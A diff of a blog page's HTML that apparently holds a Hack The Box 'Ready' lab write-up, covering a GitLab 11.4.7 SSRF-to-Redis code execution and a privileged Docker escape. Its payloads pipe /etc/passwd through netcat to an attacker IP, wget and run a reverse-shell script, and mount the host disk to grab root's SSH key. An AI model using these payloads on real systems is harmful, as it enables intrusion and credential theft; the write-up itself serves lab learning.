@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en"><meta charset="utf-8"><meta name="generator" content="Hugo 0.83.1" /><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<html lang="en"><meta charset="utf-8"><meta name="generator" content="Hugo 0.99.1" /><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
 <meta name="color-scheme" content="light dark">
 <meta name="supported-color-schemes" content="light dark"><title>HTB Ready&nbsp;&ndash;&nbsp;The Wolf Den</title><link rel="stylesheet" href="/css/core.min.8a20650921066633f421ce7a745e34cd4032f36a72cc46f51a06d1fe62549284c37e461fd23cd89b3f123ccdc212cd1b.css" integrity="sha384-iiBlCSEGZjP0Ic56dF40zUAy82pyzEb1GgbR/mJUkoTDfkYf0jzYmz8SPM3CEs0b"><meta name="twitter:card" content="summary" />
 <meta name="twitter:title" content="HTB Ready" /><body><section id="header">
@@ -9,29 +9,29 @@
         alt/></p>
 <p>Ready is a GitLab instance were we exploit an SSRF in order to get code execution and find ourselves in a docker container. We find some credentials to escalate to root inside the container and then leverage the fact it was started with the &ldquo;privileged&rdquo; flag to escape the container.</p>
 <h2 id="enumeration">Enumeration</h2>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Starting Nmap 7.91 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-01-27 00:15 UTC
-Nmap scan report <span style="color:#66d9ef">for</span> 10.129.90.66
-Host is up <span style="color:#f92672">(</span>0.095s latency<span style="color:#f92672">)</span>.
-Not shown: <span style="color:#ae81ff">998</span> closed ports
-PORT     STATE SERVICE VERSION
-22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu <span style="color:#ae81ff">4</span> <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
-| ssh-hostkey:
-|   <span style="color:#ae81ff">3072</span> 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
-|   <span style="color:#ae81ff">256</span> b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
-|_  <span style="color:#ae81ff">256</span> 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
-5080/tcp open  http    nginx
-| http-robots.txt: <span style="color:#ae81ff">53</span> disallowed entries <span style="color:#f92672">(</span><span style="color:#ae81ff">15</span> shown<span style="color:#f92672">)</span>
-| / /autocomplete/users /search /api /admin /profile
-| /dashboard /projects/new /groups/new /groups/*/edit /users /help
-|_/s/ /snippets/new /snippets/*/edit
-| http-title: Sign in <span style="color:#ae81ff">\x</span>C2<span style="color:#ae81ff">\x</span>B7 GitLab
-|_Requested resource was http://10.129.90.66:5080/users/sign_in
-|_http-trane-info: Problem with XML parsing of /evox/about
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 20.31 seconds
-</code></pre></div><p>NMAP shows that port 22 is open for SSH and there is a GitLab instance running a web server on port 5080. A sign in page is accessible that allows new accounts to be created.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Starting Nmap 7.91 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-01-27 00:15 UTC
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.90.66
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.095s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">998</span> closed ports
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu <span style="color:#ae81ff">4</span> <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey:
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>5080/tcp open  http    nginx
+</span></span><span style="display:flex;"><span>| http-robots.txt: <span style="color:#ae81ff">53</span> disallowed entries <span style="color:#f92672">(</span><span style="color:#ae81ff">15</span> shown<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| / /autocomplete/users /search /api /admin /profile
+</span></span><span style="display:flex;"><span>| /dashboard /projects/new /groups/new /groups/*/edit /users /help
+</span></span><span style="display:flex;"><span>|_/s/ /snippets/new /snippets/*/edit
+</span></span><span style="display:flex;"><span>| http-title: Sign in <span style="color:#ae81ff">\x</span>C2<span style="color:#ae81ff">\x</span>B7 GitLab
+</span></span><span style="display:flex;"><span>|_Requested resource was http://10.129.90.66:5080/users/sign_in
+</span></span><span style="display:flex;"><span>|_http-trane-info: Problem with XML parsing of /evox/about
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 20.31 seconds
+</span></span></code></pre></div><p>NMAP shows that port 22 is open for SSH and there is a GitLab instance running a web server on port 5080. A sign in page is accessible that allows new accounts to be created.</p>
 <p><img  src="/img/ready-gitlabsignup.png"
         alt/></p>
 <p>With a newly created account it is possible to check for any public projects or users to find more information in this box. However, in this instance there isn&rsquo;t anything and the instance appears blank.</p>
@@ -41,57 +41,57 @@ Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</spa
 <p>Research on GitLab 11.4.7 there is a well know RCE through an Server Side Request Forgery, a type of vulnerability, where an an attacker can change a URL which the server will attempt to read or submit data too. In this case, it allows us to interact with an internal redis database service and start a malicious worker package.  This vulnerability was was featured in Real World CTF 2018 and LiveOverflow created a <a href="https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/"target="_blank" rel="noopener noreferrer">video and blog post</a>
  detailing it.</p>
 <p>It is possible to follow along with the blog post to create a proof of concept allowing  <code>/etc/passwd</code> to be read.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"> multi
- sadd resque:gitlab:queues system_hook_push
- lpush resque:gitlab:queue:system_hook_push <span style="color:#e6db74">&#34;{\&#34;class\&#34;:\&#34;GitlabShellWorker\&#34;,\&#34;args\&#34;:[\&#34;class_eval\&#34;,\&#34;open(\&#39;|cat /etc/passwd | nc 10.10.14.142 1234\&#39;).read\&#34;],\&#34;retry\&#34;:3,\&#34;queue\&#34;:\&#34;system_hook_push\&#34;,\&#34;jid\&#34;:\&#34;ad52abc5641173e217eb2e52\&#34;,\&#34;created_at\&#34;:1513714403.8122594,\&#34;enqueued_at\&#34;:1513714403.8129568}&#34;</span>
- exec
- exec
-/ssrf.git
-</code></pre></div><p>This payload is URL encoded and then <code>git://[0:0:0:0:0:ffff:127.0.0.1]:6379/</code> is added to the front to bypass the check filter to block requests to localhost on the GitLab server. The next step is to create a new project and chose to import a git repo by URL.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> multi
+</span></span><span style="display:flex;"><span> sadd resque:gitlab:queues system_hook_push
+</span></span><span style="display:flex;"><span> lpush resque:gitlab:queue:system_hook_push <span style="color:#e6db74">&#34;{\&#34;class\&#34;:\&#34;GitlabShellWorker\&#34;,\&#34;args\&#34;:[\&#34;class_eval\&#34;,\&#34;open(\&#39;|cat /etc/passwd | nc 10.10.14.142 1234\&#39;).read\&#34;],\&#34;retry\&#34;:3,\&#34;queue\&#34;:\&#34;system_hook_push\&#34;,\&#34;jid\&#34;:\&#34;ad52abc5641173e217eb2e52\&#34;,\&#34;created_at\&#34;:1513714403.8122594,\&#34;enqueued_at\&#34;:1513714403.8129568}&#34;</span>
+</span></span><span style="display:flex;"><span> exec
+</span></span><span style="display:flex;"><span> exec
+</span></span><span style="display:flex;"><span>/ssrf.git
+</span></span></code></pre></div><p>This payload is URL encoded and then <code>git://[0:0:0:0:0:ffff:127.0.0.1]:6379/</code> is added to the front to bypass the check filter to block requests to localhost on the GitLab server. The next step is to create a new project and chose to import a git repo by URL.</p>
 <p><img  src="/img/ready-importproject.png"
         alt/></p>
 <p>Provide our URL encoded payload, set up a netcat listener on port 1234, and then submitting the payload, returns the contents of <code>/etc/password</code></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git://<span style="color:#f92672">[</span>0:0:0:0:0:ffff:127.0.0.1<span style="color:#f92672">]</span>:6379/%0A%20multi%0A%20sadd%20resque:gitlab:queues%20system_hook_push%0A%20lpush%20resque:gitlab:queue:system_hook_push%20%22%7B%5C%22class%5C%22:%5C%22GitlabShellWorker%5C%22,%5C%22args%5C%22:%5B%5C%22class_eval%5C%22,%5C%22open<span style="color:#f92672">(</span>%5C<span style="color:#e6db74">&#39;%7Ccat%20/etc/passwd%20%7C%20nc%2010.10.14.142%201234%5C&#39;</span><span style="color:#f92672">)</span>.read%5C%22%5D,%5C%22retry%5C%22:3,%5C%22queue%5C%22:%5C%22system_hook_push%5C%22,%5C%22jid%5C%22:%5C%22ad52abc5641173e217eb2e52%5C%22,%5C%22created_at%5C%22:1513714403.8122594,%5C%22enqueued_at%5C%22:1513714403.8129568%7D%22%0A%20exec%0A%20exec%0A/ssrf.git
-</code></pre></div><p><img  src="/img/ready-etcpasswdfromimport.png"
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>git://<span style="color:#f92672">[</span>0:0:0:0:0:ffff:127.0.0.1<span style="color:#f92672">]</span>:6379/%0A%20multi%0A%20sadd%20resque:gitlab:queues%20system_hook_push%0A%20lpush%20resque:gitlab:queue:system_hook_push%20%22%7B%5C%22class%5C%22:%5C%22GitlabShellWorker%5C%22,%5C%22args%5C%22:%5B%5C%22class_eval%5C%22,%5C%22open<span style="color:#f92672">(</span>%5C<span style="color:#e6db74">&#39;%7Ccat%20/etc/passwd%20%7C%20nc%2010.10.14.142%201234%5C&#39;</span><span style="color:#f92672">)</span>.read%5C%22%5D,%5C%22retry%5C%22:3,%5C%22queue%5C%22:%5C%22system_hook_push%5C%22,%5C%22jid%5C%22:%5C%22ad52abc5641173e217eb2e52%5C%22,%5C%22created_at%5C%22:1513714403.8122594,%5C%22enqueued_at%5C%22:1513714403.8129568%7D%22%0A%20exec%0A%20exec%0A/ssrf.git
+</span></span></code></pre></div><p><img  src="/img/ready-etcpasswdfromimport.png"
         alt/></p>
 <h2 id="foothold">Foothold</h2>
 <p>Obtaining a reverse shell proved to be a bit tricky. Executing one reverse shell directly from called back but then terminated immediately. Instead, a shell can be obtained in few additional steps. Create a bash reverse shell in a script and start a python http server. Then use two SSRF requests. The first one downloads the revershell using wget. The second one executes it.</p>
 <p><strong>Get script.sh</strong></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"> multi
- sadd resque:gitlab:queues system_hook_push
- lpush resque:gitlab:queue:system_hook_push <span style="color:#e6db74">&#34;{\&#34;class\&#34;:\&#34;GitlabShellWorker\&#34;,\&#34;args\&#34;:[\&#34;class_eval\&#34;,\&#34;open(\&#39;| wget http://10.10.14.142/script.sh \&#39;).read\&#34;],\&#34;retry\&#34;:3,\&#34;queue\&#34;:\&#34;system_hook_push\&#34;,\&#34;jid\&#34;:\&#34;ad52abc5641173e217eb2e52\&#34;,\&#34;created_at\&#34;:1513714403.8122594,\&#34;enqueued_at\&#34;:1513714403.8129568}&#34;</span>
- exec
- exec
-/ssrf.git
-</code></pre></div><p><strong>Execute script.sh</strong></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"> multi
- sadd resque:gitlab:queues system_hook_push
- lpush resque:gitlab:queue:system_hook_push <span style="color:#e6db74">&#34;{\&#34;class\&#34;:\&#34;GitlabShellWorker\&#34;,\&#34;args\&#34;:[\&#34;class_eval\&#34;,\&#34;open(\&#39;| bash script.sh \&#39;).read\&#34;],\&#34;retry\&#34;:3,\&#34;queue\&#34;:\&#34;system_hook_push\&#34;,\&#34;jid\&#34;:\&#34;ad52abc5641173e217eb2e52\&#34;,\&#34;created_at\&#34;:1513714403.8122594,\&#34;enqueued_at\&#34;:1513714403.8129568}&#34;</span>
- exec
- exec
-/ssrf.git
-</code></pre></div><p><img  src="/img/ready-shellhuzzah.png"
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> multi
+</span></span><span style="display:flex;"><span> sadd resque:gitlab:queues system_hook_push
+</span></span><span style="display:flex;"><span> lpush resque:gitlab:queue:system_hook_push <span style="color:#e6db74">&#34;{\&#34;class\&#34;:\&#34;GitlabShellWorker\&#34;,\&#34;args\&#34;:[\&#34;class_eval\&#34;,\&#34;open(\&#39;| wget http://10.10.14.142/script.sh \&#39;).read\&#34;],\&#34;retry\&#34;:3,\&#34;queue\&#34;:\&#34;system_hook_push\&#34;,\&#34;jid\&#34;:\&#34;ad52abc5641173e217eb2e52\&#34;,\&#34;created_at\&#34;:1513714403.8122594,\&#34;enqueued_at\&#34;:1513714403.8129568}&#34;</span>
+</span></span><span style="display:flex;"><span> exec
+</span></span><span style="display:flex;"><span> exec
+</span></span><span style="display:flex;"><span>/ssrf.git
+</span></span></code></pre></div><p><strong>Execute script.sh</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> multi
+</span></span><span style="display:flex;"><span> sadd resque:gitlab:queues system_hook_push
+</span></span><span style="display:flex;"><span> lpush resque:gitlab:queue:system_hook_push <span style="color:#e6db74">&#34;{\&#34;class\&#34;:\&#34;GitlabShellWorker\&#34;,\&#34;args\&#34;:[\&#34;class_eval\&#34;,\&#34;open(\&#39;| bash script.sh \&#39;).read\&#34;],\&#34;retry\&#34;:3,\&#34;queue\&#34;:\&#34;system_hook_push\&#34;,\&#34;jid\&#34;:\&#34;ad52abc5641173e217eb2e52\&#34;,\&#34;created_at\&#34;:1513714403.8122594,\&#34;enqueued_at\&#34;:1513714403.8129568}&#34;</span>
+</span></span><span style="display:flex;"><span> exec
+</span></span><span style="display:flex;"><span> exec
+</span></span><span style="display:flex;"><span>/ssrf.git
+</span></span></code></pre></div><p><img  src="/img/ready-shellhuzzah.png"
         alt/></p>
 <h2 id="user">User</h2>
 <p>Very first thing to do, especially since this was a pain, is to upgrade are shell so we have more options and are less likely to crash it.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git@gitlab:~/gitlab-rails/working$ python3 -c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
-&lt;orking$ python3 -c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
-git@gitlab:~/gitlab-rails/working$ ^Z
-zsh: suspended  nc -lnvp <span style="color:#ae81ff">1234</span>
-
-┌──<span style="color:#f92672">(</span>nightwolf㉿archlinux<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HTB/Ready<span style="color:#f92672">]</span>
-└─$ stty -a | head -n1 | cut -d <span style="color:#e6db74">&#39;;&#39;</span> -f 2-3 | cut -b2- | sed <span style="color:#e6db74">&#39;s/; /\n/&#39;</span>                                                                                          <span style="color:#ae81ff">148</span> ⨯ <span style="color:#ae81ff">1</span> ⚙
-rows <span style="color:#ae81ff">54</span>
-columns <span style="color:#ae81ff">170</span>
-
-┌──<span style="color:#f92672">(</span>nightwolf㉿archlinux<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HTB/Ready<span style="color:#f92672">]</span>
-└─$ stty raw -echo; fg                                                                                                                                                <span style="color:#ae81ff">1</span> ⚙
-<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>  + continued  nc -lnvp <span style="color:#ae81ff">1234</span>
-                               stty rows <span style="color:#ae81ff">54</span> cols <span style="color:#ae81ff">170</span>
-git@gitlab:~/gitlab-rails/working$ export TERM<span style="color:#f92672">=</span>xterm-256color
-git@gitlab:~/gitlab-rails/working$ exec /bin/bash
-git@gitlab:~/gitlab-rails/working$
-</code></pre></div><p>The user can be found in <code>/home/dude/user.txt</code> but the current user of <code>gitlab</code> is unable to read the file itself. <code>gitlab</code> doesn&rsquo;t have any interesting groups or files that stand out in it&rsquo;s  home folder. There don&rsquo;t have any passwords to try with suds or su. Expanding the search, for config files that might contain credentials or other interesting info,  <code>.dockerenv</code> is found. This  is a file in the root of the file system, letting us know that the current shell is inside a docker container.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>git@gitlab:~/gitlab-rails/working$ python3 -c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span><span style="display:flex;"><span>&lt;orking$ python3 -c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span><span style="display:flex;"><span>git@gitlab:~/gitlab-rails/working$ ^Z
+</span></span><span style="display:flex;"><span>zsh: suspended  nc -lnvp <span style="color:#ae81ff">1234</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>nightwolf㉿archlinux<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HTB/Ready<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ stty -a | head -n1 | cut -d <span style="color:#e6db74">&#39;;&#39;</span> -f 2-3 | cut -b2- | sed <span style="color:#e6db74">&#39;s/; /\n/&#39;</span>                                                                                          <span style="color:#ae81ff">148</span> ⨯ <span style="color:#ae81ff">1</span> ⚙
+</span></span><span style="display:flex;"><span>rows <span style="color:#ae81ff">54</span>
+</span></span><span style="display:flex;"><span>columns <span style="color:#ae81ff">170</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>nightwolf㉿archlinux<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HTB/Ready<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ stty raw -echo; fg                                                                                                                                                <span style="color:#ae81ff">1</span> ⚙
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>  + continued  nc -lnvp <span style="color:#ae81ff">1234</span>
+</span></span><span style="display:flex;"><span>                               stty rows <span style="color:#ae81ff">54</span> cols <span style="color:#ae81ff">170</span>
+</span></span><span style="display:flex;"><span>git@gitlab:~/gitlab-rails/working$ export TERM<span style="color:#f92672">=</span>xterm-256color
+</span></span><span style="display:flex;"><span>git@gitlab:~/gitlab-rails/working$ exec /bin/bash
+</span></span><span style="display:flex;"><span>git@gitlab:~/gitlab-rails/working$
+</span></span></code></pre></div><p>The user can be found in <code>/home/dude/user.txt</code> but the current user of <code>gitlab</code> is unable to read the file itself. <code>gitlab</code> doesn&rsquo;t have any interesting groups or files that stand out in it&rsquo;s  home folder. There don&rsquo;t have any passwords to try with suds or su. Expanding the search, for config files that might contain credentials or other interesting info,  <code>.dockerenv</code> is found. This  is a file in the root of the file system, letting us know that the current shell is inside a docker container.</p>
 <p><img  src="/img/ready-inthematrix.png"
         alt/></p>
 <p>In the the <code>/opt</code> directory there is a folder titled &ldquo;backup&rdquo; inside are various configuration files for GitLab and a docker compose file that looks to have been the same one that may have been used to start this container.</p>
@@ -108,9 +108,9 @@ git@gitlab:~/gitlab-rails/working$
 <p>When the operator executes <code>docker run --privileged</code>, Docker will enable access to all devices on the host as well as set some configuration in AppArmor or SELinux to allow the container nearly all the same access to the host as processes running outside containers on the host. Additional information about running with <code>--privileged</code> is available on the <a href="http://blog.docker.com/2013/09/docker-can-now-run-within-docker/"target="_blank" rel="noopener noreferrer">Docker Blog</a>
 .&rdquo;</p>
 <p>This is going to enable escape from the container and gain root on the host in two very simple commands. First make a directory and then simply mount sda2 in that directory.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mkdir -p /mnt/hola
-mount /dev/sda2 /mnt/hola
-</code></pre></div><p>From the the file system from of the host system is accessible the container.  <code>/mnt/hola/root</code> contains the root flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mkdir -p /mnt/hola
+</span></span><span style="display:flex;"><span>mount /dev/sda2 /mnt/hola
+</span></span></code></pre></div><p>From the the file system from of the host system is accessible the container.  <code>/mnt/hola/root</code> contains the root flag.</p>
 <p><img  src="/img/ready-mountoutsidefilesystem.png"
         alt/></p>
 <p>It is possible to obtain a root shell on the host system itself through several methods. One of which is retrive the root ssh key from, <code>/mnt/hola/root/.ssh/id_rsa</code></p>
